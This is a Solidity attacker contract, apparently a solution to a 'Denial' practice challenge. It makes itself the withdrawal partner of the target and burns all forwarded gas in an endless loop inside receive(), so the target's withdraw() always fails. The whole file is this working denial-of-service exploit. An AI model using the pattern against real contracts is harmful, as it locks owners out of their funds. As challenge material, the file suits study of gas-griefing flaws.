// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "./Denial.sol";
import {console} from "forge-std/Test.sol";

contract DenialAttacker {
    Denial public immutable i_denial;

    constructor(address _denial) {
        i_denial = Denial(payable(_denial));
    }

    function setPartner() external {
        i_denial.setWithdrawPartner(address(this));
    }

    function attack() external {
        i_denial.withdraw();
    }

    receive() external payable {
        while (true) {}
    }
}
